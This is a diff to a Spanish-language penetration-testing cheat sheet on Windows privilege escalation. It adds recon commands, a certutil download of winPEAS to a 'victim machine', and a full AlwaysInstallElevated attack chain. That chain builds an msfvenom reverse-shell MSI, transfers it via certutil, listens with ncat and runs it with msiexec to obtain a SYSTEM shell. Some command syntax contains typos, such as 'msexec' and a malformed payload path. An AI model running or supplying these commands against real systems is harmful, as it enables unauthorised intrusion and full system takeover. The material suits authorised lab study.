@@ -271,6 +271,15 @@ chmod +x linPEAS.sh
 ```
 <br>
 ## ESCALADA DE PRIVILEGIOS EN WINDOWS.
+## systeminfo | reg query.
+Comando para aplicar reconocimiento dentro del equipo y ver la versión del sistema operativo mediante la función reg query.
+```
+reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName
+```
+<br>
+## whoami /all.
+Este comando muestra información del token de acceso, el nombre de usuario, los identificadores de seguridad(SID), los privilegios y grupos a los cuales pertenece el usuario actual.
+<br>
 ## whoami /priv.
 Este comando te permite ver los privilegios que tiene asignado el usuario actual.<br>
 En caso de que el usuario tenga asignado el privilegio SeImpersonatePrivilege puedes llegar a escalar privilegios haciendo uso de la herramienta juicypotato.exe que se encuentra en github.<br>Lo que hace el juicypotato.exe es crear un usuario y despues lo asigna al grupo Administrator para que tenga los privilegios maximos dentro del sistema.<br>
@@ -337,9 +346,34 @@ sudo ncat -nlvp 443		# Desde tu equipo.
 sc.exe start <name_process>	# Iniciar un servicio.
 ```
 <br>
-## whoamin /all.
+## winPEAS.exe.
+winPEAS es una herramienta que te ayuda a aplicar reconocimiento en el sistema e identificar posibles vectores por los cuales puedes llegar a escalar priviegios.<br>
+Lo que tienes que hacer es descargar el winPEAS.exe de github para despues transferirlo a la máquina víctima con certutil.exe
+```
+sudo python3 -m http.server 80
+
+certutil.exe -f -urlcache -split http://<ip-address>/winPEAS.exe winpeas.exe
+winpeas.exe
+```
+Ya solo queda buscar por aquelas partes que esten en color rojo ya que representan una forma segura por la cual elevar privilegios.<br>
+- AlwaysInstallElevated.<br>Es una directiva que te permite instalar un paquete de instalador de Windows con privilegios elevados.<br>Si esta directiva se encuentra con un 1 (AlwaysInstallElevated set to 1 in HKLM) puedes crearte un archivo malicioso con msfvenom que contenga una reverse shell para enviarte una consola como el usuario NT Authority\System.
 
 
+```
+msfvenom -p /window/x64/shell_reverse_tcp LHOST=<ip-address> LPORT=443 --platform windows -a x64 -f msi -o reverse_shell.msi
+# -p = Para especificar el tipo de payload a utilizar.
+# LHOST = IP addres a la cual quieres que se envíe la reverse shell.
+# LPORT = Puerto por el cual se enviará la reverse shell.
+# --platform windows -a x64 = Indica que es un OS Windows de 64 bits.
+# -f = Tipo de extensión que tendrá el payload.
+# -o = Nombre que tendrá el archivo al ser exportado.
+
+certutil.exe -f -urlcache -split http://<ip-address>/reverse_shell.msi reverse.msi
+# Tranferir el archivo reverse_shell.msi a la máquina con el nombre de reverse.msi
+
+sudo rlwrap ncat -nlvp 443	# Ponerse en escucha para recibir la consola interactiva.
+msexec /quiet /qn /i reverse.msi	# Ejecutar el archivo reverse.msi (Antes de ejecutarlo debes ponerte en escucha con ncat).
+```
 
 
 
